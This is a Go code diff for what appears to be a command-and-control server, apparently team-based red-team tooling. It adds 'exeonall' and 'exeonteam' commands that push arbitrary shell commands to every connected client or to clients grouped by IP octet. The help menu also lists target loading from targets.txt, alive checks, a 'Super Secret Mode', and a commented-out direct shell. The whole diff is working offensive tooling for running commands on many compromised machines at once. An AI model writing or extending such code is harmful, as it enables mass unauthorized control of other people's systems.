@@ -66,12 +66,12 @@ func print_help() {
 	fmt.Println("\tsend <ID> <message>          Send message to client at ID")
 	fmt.Println("\texe <ID> <command>           Send command to client at ID")
 	fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
-	// fmt.Println("\texeonall <command>           Execute <command> on all clients")
+	fmt.Println("\texeonall <command>           Execute <command> on all clients")
 	// fmt.Println("\tsendtoteam <team> <command>  Send <command> to all <team> clients")
-	// fmt.Println("\texeonteam <team> <command>   Execute <command> on all <team> clients")
+	fmt.Println("\texeonteam <team> <command>   Execute <command> on all <team> clients")
 	fmt.Println("\tload                         Loads all clients specified in targets.txt")
 	fmt.Println("\tcheckalive                   Generates a board of replying clients")
-	// [FIX]fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
+	// [FIX] fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
 	fmt.Println("\tkill                         Stops server")
 	fmt.Println("\tssm                          Toggles Super Secret Mode")
 	fmt.Println("\tdebug                        Toggles Debug")
@@ -435,6 +435,15 @@ func main() {
 				sendmessage(command, k, *c)
 			}
 
+		} else if strings.HasPrefix(input, "exeonall") {
+			execute = true
+			_, command, _ := strings.Cut(input, " ")
+			command = strings.TrimRight(command, "\r\n")
+			fmt.Println("[BEFORE]", command)
+			for k := range clients {
+				sendmessage(command, k, *c)
+			}
+
 		} else if strings.HasPrefix(input, "send") {
 			execute = false
 			_, after, _ := strings.Cut(input, " ")
@@ -471,6 +480,18 @@ func main() {
 			}
 			time.Sleep(7000 * time.Millisecond)
 			showalive()
+
+		} else if strings.HasPrefix(input, "exeonteam") {
+			execute = true
+			_, after, _ := strings.Cut(input, " ")
+			team, command, _ := strings.Cut(after, " ")
+			command = strings.TrimRight(command, "\r\n")
+			for id, ip := range clients {
+				tokens := strings.Split(ip, ".")
+				if tokens[1] == team {
+					sendmessage(command, id, *c)
+				}
+			}
 
 		} else if strings.HasPrefix(input, "load") {
 			load()
